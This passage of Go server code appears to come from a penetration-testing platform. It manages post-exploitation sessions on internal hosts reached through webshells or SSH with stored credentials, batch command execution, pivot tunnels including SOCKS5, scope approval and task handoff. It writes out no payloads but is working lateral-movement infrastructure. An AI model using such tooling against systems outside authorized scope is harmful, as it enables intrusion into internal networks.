	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的会话 ID")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	events, err := pg.ListIntranetSessionEvents(id, atoiDefault(r.URL.Query().Get("limit"), 100))
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"events": events})
}

func (s *Server) batchExecIntranetSessions(w http.ResponseWriter, r *http.Request) {
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req struct {
		SessionIDs     []int64 `json:"session_ids"`
		TaskID         int64   `json:"task_id"`
		Command        string  `json:"command"`
		TimeoutSeconds int     `json:"timeout_seconds"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	if strings.TrimSpace(req.Command) == "" {
		writeErr(w, 400, "命令不能为空")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	timeout := time.Duration(req.TimeoutSeconds) * time.Second
	if timeout <= 0 || timeout > 180*time.Second {
		timeout = intranetExecTimeout
	}
	results, err := s.intranetBatchExec(r.Context(), pg, req.SessionIDs, req.TaskID, req.Command, timeout)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"results": results, "total": len(results)})
}

type intranetBatchItem struct {
	SessionID int64               `json:"session_id"`
	Name      string              `json:"name"`
	Result    intranetExecOutcome `json:"result"`
	Error     string              `json:"error,omitempty"`
}

func (s *Server) intranetBatchExec(ctx context.Context, pg *db.DB, sessionIDs []int64, taskID int64, command string, timeout time.Duration) ([]intranetBatchItem, error) {
	ids := sessionIDs
	if len(ids) == 0 && taskID > 0 {
		sessions, _, err := pg.ListIntranetSessions(db.IntranetSessionActive, taskID, 500, 0)
		if err != nil {
			return nil, err
		}
		for _, sess := range sessions {
			ids = append(ids, sess.ID)
		}
	}
	if len(ids) == 0 {
		return nil, errors.New("需要 session_ids 或 task_id")
	}
	if len(ids) > intranetBatchLimit {
		ids = ids[:intranetBatchLimit]
	}
	if timeout <= 0 {
		timeout = intranetExecTimeout
	}
	results := make([]intranetBatchItem, 0, len(ids))
	for _, sid := range ids {
		item := intranetBatchItem{SessionID: sid}
		sess, err := s.intranetSession(pg, sid)
		if err != nil {
			item.Error = err.Error()
			results = append(results, item)
			continue
		}
		item.Name = sess.Name
		item.Result = s.intranetExec(ctx, pg, sess, command, timeout)
		results = append(results, item)
	}
	return results, nil
}

func (s *Server) resolveIntranetTunnelTask(pg *db.DB, in *db.IntranetTunnelInput) {
	if in.TaskID > 0 || in.SessionID <= 0 {
		return
	}
	if sess, err := pg.GetIntranetSession(in.SessionID); err == nil && sess.TaskID != nil {
		in.TaskID = *sess.TaskID
	}
}

func (s *Server) createIntranetTunnel(w http.ResponseWriter, r *http.Request) {
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req intranetTunnelDTO
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	kind := strings.ToLower(strings.TrimSpace(req.Kind))
	if kind == "" {
		kind = db.IntranetTunnelKindPort
	}
	if req.ListenPort < 1 || req.ListenPort > 65535 {
		writeErr(w, 400, "listen_port 必须在 1-65535 之间")
		return
	}
	side, err := intranetListenSideArg(req.ListenSide)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if kind != db.IntranetTunnelKindSocks5 && (req.RemotePort < 1 || req.RemotePort > 65535) {
		writeErr(w, 400, "remote_port 必须在 1-65535 之间")
		return
	}
	if msg := intranetTaskGuard(pg, req.TaskID); msg != "" {
		writeErr(w, 400, msg)
		return
	}
	in := db.IntranetTunnelInput{
		Name: req.Name, SessionID: req.SessionID, TaskID: req.TaskID, Kind: kind,
		ListenHost: req.ListenHost, ListenPort: req.ListenPort, ListenSide: side,
		RemoteHost: intranetHost(req.RemoteHost), RemotePort: req.RemotePort,
		DeployCommand: req.DeployCommand, VerifyCommand: req.VerifyCommand,
		TeardownCommand: req.TeardownCommand, Note: req.Note,
	}
	if in.SessionID > 0 {
		if _, err := s.intranetSession(pg, in.SessionID); err != nil {
			writeErr(w, 400, err.Error())
			return
		}
	}
	s.resolveIntranetTunnelTask(pg, &in)
	if reason, allowed := shellAllowed(pg, in.RemoteHost); !allowed {
		writeErr(w, 400, "目标命中资产拦截规则："+reason)
		return
	}
	t, err := pg.CreateIntranetTunnel(in)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"tunnel": t})
}

func (s *Server) listIntranetTunnels(w http.ResponseWriter, r *http.Request) {
	pg := s.pg(w)
	if pg == nil {
		return
	}
	q := r.URL.Query()
	taskID, _ := strconv.ParseInt(strings.TrimSpace(q.Get("task_id")), 10, 64)
	sessionID, _ := strconv.ParseInt(strings.TrimSpace(q.Get("session_id")), 10, 64)
	tunnels, total, err := pg.ListIntranetTunnels(q.Get("status"), taskID, sessionID, atoiDefault(q.Get("limit"), 100), atoiDefault(q.Get("offset"), 0))
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"tunnels": tunnels, "total": total})
}

func (s *Server) getIntranetTunnel(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的隧道 ID")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	t, err := pg.GetIntranetTunnel(id)
	if err != nil {
		writeErr(w, 404, "隧道不存在")
		return
	}
	writeJSON(w, 200, map[string]any{"tunnel": t, "access": s.intranetTunnelAccess(pg, t)})
}

func (s *Server) deleteIntranetTunnel(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的隧道 ID")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	t, err := pg.GetIntranetTunnel(id)
	if err != nil {
		writeErr(w, 404, "隧道不存在")
		return
	}
	if t.Status != db.IntranetTunnelStopped {
		if s.resourceMgr != nil {
			if res, _ := pg.FindActiveManagedResourceByTunnel(id); res != nil {
				_, _ = s.resourceMgr.release(r.Context(), res.ID, "隧道已删除")
			} else {
				s.intranetStopTunnel(r.Context(), id, "隧道已删除")
			}
		} else {
			s.intranetStopTunnel(r.Context(), id, "隧道已删除")
		}
	}
	deleted, err := pg.DeleteIntranetTunnel(id)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"ok": deleted})
}

func (s *Server) intranetTunnelFromRequest(w http.ResponseWriter, r *http.Request) (*db.DB, *db.IntranetTunnel, bool) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的隧道 ID")
		return nil, nil, false
	}
	pg := s.pg(w)
	if pg == nil {
		return nil, nil, false
	}
	t, err := pg.GetIntranetTunnel(id)
	if err != nil {
		writeErr(w, 404, "隧道不存在")
		return nil, nil, false
	}
	return pg, t, true
}

func (s *Server) probeIntranetTunnel(w http.ResponseWriter, r *http.Request) {
	pg, t, ok := s.intranetTunnelFromRequest(w, r)
	if !ok {
		return
	}
	if t.SessionID == nil || *t.SessionID <= 0 {
		writeErr(w, 400, "隧道未绑定会话")
		return
	}
	sess, err := s.intranetSession(pg, *t.SessionID)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	info, out := s.intranetProbe(r.Context(), pg, sess)
	writeJSON(w, 200, map[string]any{"probe": info, "result": out})
}

func (s *Server) planIntranetTunnel(w http.ResponseWriter, r *http.Request) {
	pg, t, ok := s.intranetTunnelFromRequest(w, r)
	if !ok {
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req intranetTunnelActionDTO
	_ = decode(r, &req)
	side, err := intranetListenSideArg(req.ListenSide)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	// 手写 deploy_command 时自动选型不参与，监听侧只能由请求纠正；记错侧，验证与
	// 拆除复核都会去错误的一台机器上看端口。
	if side != "" {
		if _, err := pg.UpdateIntranetTunnelPlan(t.ID, "", "", "", "", side); err != nil {
			writeErr(w, 400, err.Error())
			return
		}
		if fresh, gerr := pg.GetIntranetTunnel(t.ID); gerr == nil {
			t = fresh
		}
	}
	updated, info, err := s.intranetPlanTunnel(r.Context(), pg, t, req.DeployCommand, req.VerifyCommand, req.TeardownCommand)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"tunnel": updated, "probe": info, "listen_side": updated.ListenSide})
}

func (s *Server) deployIntranetTunnel(w http.ResponseWriter, r *http.Request) {
	pg, t, ok := s.intranetTunnelFromRequest(w, r)
	if !ok {
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req intranetTunnelActionDTO
	_ = decode(r, &req)
	ttl := time.Duration(req.TTLSeconds) * time.Second
	updated, out, err := s.intranetDeployTunnel(r.Context(), pg, t, ttl)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	code := 200
	if updated.Status == db.IntranetTunnelFailed {
		code = 400
	}
	writeJSON(w, code, map[string]any{"tunnel": updated, "result": out, "access": s.intranetTunnelAccess(pg, updated)})
}

func (s *Server) verifyIntranetTunnel(w http.ResponseWriter, r *http.Request) {
	pg, t, ok := s.intranetTunnelFromRequest(w, r)
	if !ok {
		return
	}
	updated, out, err := s.intranetVerifyTunnel(r.Context(), pg, t)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	code := 200
	if updated.Status != db.IntranetTunnelVerified {
		code = 400
	}
	writeJSON(w, code, map[string]any{"tunnel": updated, "result": out, "access": s.intranetTunnelAccess(pg, updated)})
}

func (s *Server) teardownIntranetTunnel(w http.ResponseWriter, r *http.Request) {
	pg, t, ok := s.intranetTunnelFromRequest(w, r)
	if !ok {
		return
	}
	if s.resourceMgr != nil {
		if res, _ := pg.FindActiveManagedResourceByTunnel(t.ID); res != nil {
			_, _ = s.resourceMgr.release(r.Context(), res.ID, "手动拆除隧道")
		} else {
			s.intranetStopTunnel(r.Context(), t.ID, "手动拆除隧道")
		}
	} else {
		s.intranetStopTunnel(r.Context(), t.ID, "手动拆除隧道")
	}
	updated, err := pg.GetIntranetTunnel(t.ID)
	if err != nil {
		writeErr(w, 404, "隧道不存在")
		return
	}
	writeJSON(w, 200, map[string]any{"tunnel": updated})
}

// ---------------------------------------------------------------------------
// 范围审批
// ---------------------------------------------------------------------------

func (s *Server) listIntranetScopeRequests(w http.ResponseWriter, r *http.Request) {
	pg := s.pg(w)
	if pg == nil {
		return
	}
	q := r.URL.Query()
	taskID, _ := strconv.ParseInt(strings.TrimSpace(q.Get("task_id")), 10, 64)
	rows, total, err := pg.ListIntranetScopeRequests(q.Get("status"), taskID, atoiDefault(q.Get("limit"), 100), atoiDefault(q.Get("offset"), 0))
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"requests": rows, "total": total})
}

func (s *Server) createIntranetScopeRequest(w http.ResponseWriter, r *http.Request) {
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req struct {
		TaskID    int64  `json:"task_id"`
		Host      string `json:"host"`
		Port      int    `json:"port"`
		Reason    string `json:"reason"`
		SessionID int64  `json:"session_id"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	req.Host = intranetHost(req.Host)
	row, created, err := pg.CreateIntranetScopeRequest(db.IntranetScopeRequestInput{
		TaskID: req.TaskID, Host: req.Host, Port: req.Port, Reason: req.Reason, SessionID: req.SessionID,
	})
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"request": row, "created": created})
}

func (s *Server) approveIntranetScopeRequest(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的申请 ID")
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req struct {
		Note string `json:"note"`
	}
	_ = decode(r, &req)
	pg := s.pg(w)
	if pg == nil {
		return
	}
	pending, err := pg.GetIntranetScopeRequest(id)
	if err != nil {
		writeErr(w, 404, "申请不存在")
		return
	}
	if pending.Status != db.IntranetScopePending {
		writeErr(w, 409, "该申请已处理")
		return
	}
	kind := "subdomain"
	// 带 / 的值是网段：交给存储层按 ip→cidr 归一。若按 subdomain 登记，
	// 10.99.0.0/24 会变成一个「域名」范围，段内任何 IP 都匹配不上，
	// 批准后隧道依旧被范围门禁拦住。
	if net.ParseIP(pending.Host) != nil || strings.Contains(pending.Host, "/") {
		kind = "ip"
	}
	if _, err := pg.Assets().AddAgentScope(pending.TaskID, kind, pending.Host, displayOr(strings.TrimSpace(pending.Reason), "内网范围审批"), "manual"); err != nil {
		writeErr(w, 400, "写入任务范围失败: "+err.Error())
		return
	}
	row, found, err := pg.DecideIntranetScopeRequest(id, true, req.Note)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	if !found {
		writeErr(w, 409, "该申请已处理")
		return
	}
	// 资产回流：批准的范围同步登记为平台资产，避免内网发现只停留在审批表里。
	assets := map[string]any{"registered": false}
	var warnings []string
	if ip := net.ParseIP(pending.Host); ip != nil {
		// 本机地址只有在隧道台账能解释时才是一条内网资产：否则批准一个
		// 127.0.0.1 会把平台自己登记成内网主机，资产列表与报告从此分不清「打的是
		// 谁」，下一轮扫描还会顺着这条资产打回平台自身。
		assetHost, assetPort, ok := intranetTunnelIdentity(pg, pending.Host, pending.Port)
		switch {
		case !ok:
			warnings = append(warnings, fmt.Sprintf("%s 是平台自身的地址，没有登记在册的隧道承载它：已写入授权范围但不登记资产，请改为内网主机的真实地址或先建隧道", pending.Host))
		default:
			if assetHost != pending.Host {
				warnings = append(warnings, fmt.Sprintf("按隧道映射登记为内网身份 %s（申请填的是监听地址 %s）",
					intranetHostPort(assetHost, assetPort), intranetHostPort(pending.Host, pending.Port)))
			}
			ipID, aerr := pg.Assets().UpsertIP(db.UpsertIPReq{IP: assetHost, TaskID: pending.TaskID})
			if aerr != nil {
				warnings = append(warnings, "登记 IP 资产失败: "+aerr.Error())
			} else {
				assets["registered"] = true
				assets["ip_id"] = ipID
				assets["host"] = assetHost
				if assetPort > 0 {
					svcID, serr := pg.Assets().UpsertOtherService(db.UpsertOtherServiceReq{
						IP: assetHost, Port: assetPort, ServiceName: "tcp",
						Extra: map[string]any{"source": "intranet_scope_approval"}, TaskID: pending.TaskID,
					})
					if serr != nil {
						warnings = append(warnings, "登记端口资产失败: "+serr.Error())
					} else {
						assets["service_id"] = svcID
					}
				}
			}
		}
	} else if strings.Contains(pending.Host, "/") {
		warnings = append(warnings, "批准的是网段，已写入任务授权范围但不登记资产（整段灌入会淹没资产列表）；确认具体主机后再逐个申请")
	} else if intranetHostIsLocal(pending.Host) {
		portNote := "未带端口"
		if pending.Port > 0 {
			portNote = "端口 " + strconv.Itoa(pending.Port)
		}
		warnings = append(warnings, fmt.Sprintf("%s（%s）指向平台自身：已写入授权范围但不登记资产，请改为内网主机的真实地址或先建隧道",
			pending.Host, portNote))
	} else if pending.Port > 0 {
		svcID, serr := pg.Assets().UpsertOtherService(db.UpsertOtherServiceReq{
			Domain: pending.Host, Port: pending.Port, ServiceName: "tcp",
			Extra: map[string]any{"source": "intranet_scope_approval"}, TaskID: pending.TaskID,
		})
		if serr != nil {
			warnings = append(warnings, "登记端口资产失败: "+serr.Error())
		} else {
			assets["registered"] = true
			assets["service_id"] = svcID
		}
	} else {
		warnings = append(warnings, "域名目标未带端口，未写入资产（可补充端口后重新申请）")
	}
	writeJSON(w, 200, map[string]any{"request": row, "assets": assets, "warnings": warnings})
}

func (s *Server) rejectIntranetScopeRequest(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的申请 ID")
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req struct {
		Note string `json:"note"`
	}
	_ = decode(r, &req)
	pg := s.pg(w)
	if pg == nil {
		return
	}
	row, found, err := pg.DecideIntranetScopeRequest(id, false, req.Note)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	if !found {
		writeErr(w, 409, "该申请已处理或不存在")
		return
	}
	writeJSON(w, 200, map[string]any{"request": row})
}

// ---------------------------------------------------------------------------
// 任务交接
// ---------------------------------------------------------------------------

func (s *Server) handoffIntranetTask(w http.ResponseWriter, r *http.Request) {
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req intranetHandoffDTO
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	task, warnings, err := s.intranetHandoff(pg, req)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"task": task, "warnings": warnings})
}

func (s *Server) intranetHandoff(pg *db.DB, req intranetHandoffDTO) (*Task, []string, error) {
	if req.FromTaskID <= 0 {
		return nil, nil, errors.New("需要 from_task_id")
	}
	from, err := pg.GetTask(req.FromTaskID)
	if err != nil {
		return nil, nil, err
	}
	if from == nil {
		return nil, nil, errors.New("来源任务不存在")
	}
	goal := strings.TrimSpace(req.Goal)
	if goal == "" {
		goal = "接手任务 #" + strconv.FormatInt(from.ID, 10) + " 的内网后续测试。原任务目标：" + from.Goal
	}
	desc := strings.TrimSpace(req.Description)
	if desc == "" {
		desc = from.Description
	}
	name := strings.TrimSpace(req.Name)
	if name == "" {
		name = "内网交接 · " + displayOr(from.Name, from.Goal)
	}
	task, err := s.m.CreateTaskWithOptions(desc, goal, db.TaskCreateOptions{
		Name:          name,
		SourceTaskIDs: []int64{from.ID},
	})
	if err != nil {
		return nil, nil, err
	}
	newID, err := strconv.ParseInt(task.ID, 10, 64)
	if err != nil || newID <= 0 {
		return nil, nil, errors.New("新任务已创建，但解析任务 ID 失败")
	}
	var warnings []string
	scopes, err := pg.Assets().ListTaskScope(from.ID)
	if err != nil {
		warnings = append(warnings, "读取原任务范围失败: "+err.Error())
	}
	copied := 0
	for _, ts := range scopes {
		value := ""
		switch ts.Kind {
		case "company":
			if ts.CompanyID != nil {
				value = strconv.FormatInt(*ts.CompanyID, 10)
			}
		case "root_domain", "subdomain":
			value = ts.Domain
		case "ip", "cidr":
			value = ts.Net
		default:
			value = ts.Value
		}
		if value == "" {
			continue
		}
		if _, err := pg.Assets().AddAgentScope(newID, ts.Kind, value, ts.Reason, "manual"); err != nil {
			warnings = append(warnings, fmt.Sprintf("复制范围 %s %s 失败: %v", ts.Kind, value, err))
			continue
		}
		copied++
	}
	sessionIDs := req.SessionIDs
	if len(sessionIDs) == 0 {
		if sessions, _, err := pg.ListIntranetSessions("", from.ID, 500, 0); err == nil {
			for _, sess := range sessions {
				sessionIDs = append(sessionIDs, sess.ID)
			}
		}
	}
	tunnelIDs := req.TunnelIDs
	if len(tunnelIDs) == 0 {
		if tunnels, _, err := pg.ListIntranetTunnels("", from.ID, 0, 500, 0); err == nil {
			for _, t := range tunnels {
				tunnelIDs = append(tunnelIDs, t.ID)
			}
		}
	}
	for _, sid := range sessionIDs {
		if err := pg.SetIntranetSessionTask(sid, newID); err != nil {
			warnings = append(warnings, fmt.Sprintf("会话 #%d 归属更新失败: %v", sid, err))
		}
	}
	for _, tid := range tunnelIDs {
		if err := pg.SetIntranetTunnelTask(tid, newID); err != nil {
			warnings = append(warnings, fmt.Sprintf("隧道 #%d 归属更新失败: %v", tid, err))
		}
	}
	if s.engine != nil {
		s.launchTask(task, strings.TrimSpace(desc+" "+goal), false)
	}
	return task, warnings, nil
}

// ---------------------------------------------------------------------------
// 工具复用的高层入口
// ---------------------------------------------------------------------------

// intranetOpenSession creates a session for a webshell and verifies it answers.
func (s *Server) intranetOpenSession(ctx context.Context, pg *db.DB, webshellID, taskID int64, name, host, cwd, note string) (*db.IntranetSession, intranetProbeInfo, error) {
	shell, err := pg.GetWebshell(webshellID)
	if err != nil {
		return nil, intranetProbeInfo{}, errors.New("webshell 不存在")
	}
	if strings.TrimSpace(shell.URL) == "" {
		return nil, intranetProbeInfo{}, errors.New("该 webshell 没有可用地址")
	}
	if reason, allowed := shellAllowed(pg, shell.URL); !allowed {
		return nil, intranetProbeInfo{}, errors.New("webshell 地址命中资产拦截规则：" + reason)
	}
	if strings.TrimSpace(host) == "" {
		host = displayOr(intranetHost(shell.Target), intranetHost(shell.URL))
	}
	sess, err := pg.CreateIntranetSession(db.IntranetSessionInput{
		Name: name, WebshellID: webshellID, TaskID: taskID, Host: host, Cwd: cwd, Note: note,
	})
	if err != nil {
		return nil, intranetProbeInfo{}, err
	}
	info, out := s.intranetProbe(ctx, pg, sess)
	if out.IsError && strings.TrimSpace(info.Raw) == "" {
		_, _ = pg.UpdateIntranetSessionState(sess.ID, "", db.IntranetSessionClosed, "初始探测失败")
		return sess, info, errors.New("会话已创建但探测失败: " + displayOr(out.Note, "无回显"))
	}
	return sess, info, nil
}

// ---------------------------------------------------------------------------
// SSH 承载的内网会话
// ---------------------------------------------------------------------------

// intranetSSHSessionRequest is one SSH-backed session opening. Host is the
// target's own address on the internal segment and is what the scope check, the
// ledger and asset reflux key on; DialHost/DialPort override where the platform
// actually connects, which is how a host reachable only through a port-forward
// tunnel (or only through an address the platform can route to) is logged in to
// while keeping its real identity on record.
type intranetSSHSessionRequest struct {
	Name         string `json:"name"`
	TaskID       int64  `json:"task_id"`
	Host         string `json:"host"`
	Port         int    `json:"port"`
	User         string `json:"user"`
	CredentialID int64  `json:"credential_id"`
	DialHost     string `json:"dial_host"`
	DialPort     int    `json:"dial_port"`
	Cwd          string `json:"cwd"`
	Note         string `json:"note"`
}

// intranetLocalDial describes the platform-side endpoint an SSH session connects
// to. A local address is only ever meaningful as a tunnel listener, so the tunnel
// that declares it decides whether the connection is legitimate — and against the
// tunnel we can tell whether the caller's stated identity is the one the port
// actually carries.
func intranetLocalDial(pg *db.DB, identityHost, dialHost string, dialPort int) (host string, port int, note string, err error) {
	host, port = dialHost, dialPort
	if !intranetHostIsLocal(dialHost) {
		return host, port, "", nil
	}
	var tunnel *db.IntranetTunnel
	if t, terr := pg.LiveIntranetTunnelByListen(dialHost, dialPort); terr == nil {
		tunnel = t
	}
	if tunnel == nil {
		if intranetHostIsLocal(identityHost) {
			return "", 0, "", fmt.Errorf("拒绝把平台自身作为 SSH 目标（%s）：内网主机请用它在内网段里的地址，或先建端口转发隧道再把隧道监听地址填进 dial_host/dial_port",
				intranetHostPort(dialHost, dialPort))
		}
		return host, port, fmt.Sprintf("SSH 经本机地址 %s 接入，该监听口没有登记在隧道台账里；会话按内网身份 %s 记账",
			intranetHostPort(dialHost, dialPort), identityHost), nil
	}
	if remote := intranetHost(tunnel.RemoteHost); remote != "" && identityHost != "" && remote != identityHost {
		return "", 0, "", fmt.Errorf("dial 地址 %s 由隧道 #%d 承载，其内网目标是 %s，与会话身份 %s 不一致；请改用对应端口或修正 host",
			intranetHostPort(dialHost, dialPort), tunnel.ID, remote, identityHost)
	}
	return host, port, fmt.Sprintf("SSH 经隧道 #%d（%s → %s:%d）接入", tunnel.ID,
		intranetHostPort(dialHost, dialPort), displayOr(intranetHost(tunnel.RemoteHost), identityHost), tunnel.RemotePort), nil
}

// intranetOpenSSHSession turns an SSH-only internal host into a managed session.
// Without it the platform can log a reused credential against port 22 all day and
// never execute a command: hosts with no web service cannot carry a webshell, so
// they stay outside exec, recon, persistence and the evacuation ledger alike.
func (s *Server) intranetOpenSSHSession(ctx context.Context, pg *db.DB, req intranetSSHSessionRequest) (*db.IntranetSession, intranetProbeInfo, error) {
	host := intranetHost(req.Host)
	if host == "" {
		return nil, intranetProbeInfo{}, errors.New("需要目标主机（内网段里的地址，例如 10.99.0.20）")
	}
	port := req.Port
	if port <= 0 || port > 65535 {
		port = 22
	}
	if msg := intranetTaskGuard(pg, req.TaskID); msg != "" {
		return nil, intranetProbeInfo{}, errors.New(msg)
	}
	if reason, allowed := s.intranetTargetAllowed(pg, req.TaskID, host); !allowed {
		return nil, intranetProbeInfo{}, errors.New(reason)
	}
	cred, err := pg.GetIntranetCredential(req.CredentialID)
	if err != nil || cred == nil {
		return nil, intranetProbeInfo{}, errors.New("凭据不存在：SSH 会话必须绑定凭据台账里的一条记录（可先用 intranet_cred_register 登记）")
	}
	if cred.SealBroken {
		return nil, intranetProbeInfo{}, fmt.Errorf("凭据 #%d 的口令无法解封（平台签名密钥已更换），请重新登记该凭据", cred.ID)
	}
	if strings.TrimSpace(cred.Password) == "" {
		return nil, intranetProbeInfo{}, errors.New("该凭据没有口令，无法用于 SSH 登录")
	}
	user := strings.TrimSpace(req.User)
	if user == "" {
		user = strings.TrimSpace(cred.Username)
	}
	if user == "" {
		return nil, intranetProbeInfo{}, errors.New("需要 SSH 登录账号")
	}
	dialHost := intranetHost(req.DialHost)
	dialPort := req.DialPort
	if dialHost == "" {
		dialHost, dialPort = host, port
	}
	if dialPort <= 0 || dialPort > 65535 {
		dialPort = port
	}
	dialHost, dialPort, dialNote, err := intranetLocalDial(pg, host, dialHost, dialPort)
	if err != nil {
		return nil, intranetProbeInfo{}, err
	}
	// 通过隧道映射接入时，dial 端口是本机监听口而不是目标的 SSH 端口：SSH 会话仍然
	// 把真实身份记在 host/port 上，资产回流与范围检查才不会看见一个 loopback。
	overridden := dialHost != host || dialPort != port
	meta := map[string]any{}
	if overridden {
		meta["ssh_dial"] = intranetHostPort(dialHost, dialPort)
	}
	if strings.Contains(dialNote, "隧道 #") {
		meta["ssh_via_tunnel"] = true
	}
	storedDialPort := 0
	if overridden {
		storedDialPort = dialPort
	}
	sess, err := pg.CreateIntranetSession(db.IntranetSessionInput{
		Name:            req.Name,
		TaskID:          req.TaskID,
		Host:            host,
		Cwd:             req.Cwd,
		Note:            strings.TrimSpace(displayOr(req.Note, dialNote)),
		Transport:       db.IntranetTransportSSH,
		SSHPort:         port,
		SSHUser:         user,
		SSHCredentialID: req.CredentialID,
		SSHDialHost:     dialHost,
		SSHDialPort:     storedDialPort,
		Metadata:        meta,
	})
	if err != nil {
		return nil, intranetProbeInfo{}, err
	}
	info, out := s.intranetProbe(ctx, pg, sess)
	// SSH 没有「HTTP 壳一时抽风」这种借口：登录通了、标记协议却没跑起来，就是
	// 目标上的 shell 不是预期的那种。留着 active 只会让后面每条命令都撞同一句错。
	if out.IsError {
		_, _ = pg.UpdateIntranetSessionState(sess.ID, "", db.IntranetSessionClosed, "初始 SSH 探测失败")
		if fresh, ferr := pg.GetIntranetSession(sess.ID); ferr == nil {
			sess = fresh
		}
		return sess, info, fmt.Errorf("SSH 会话探测失败，已关闭：%s", displayOr(out.Note, strings.TrimSpace(out.Output)))
	}
	if !out.IsError {
		// 登录成功是凭据最硬的证据：台账里的 SSH 凭据此前只会停在 untested。
		_, _ = pg.MarkIntranetCredentialUsed(cred.ID, db.IntranetCredValid,
			fmt.Sprintf("SSH 登录 %s:%d 成功（会话 #%d）", host, port, sess.ID))
	}
	return sess, info, nil
}
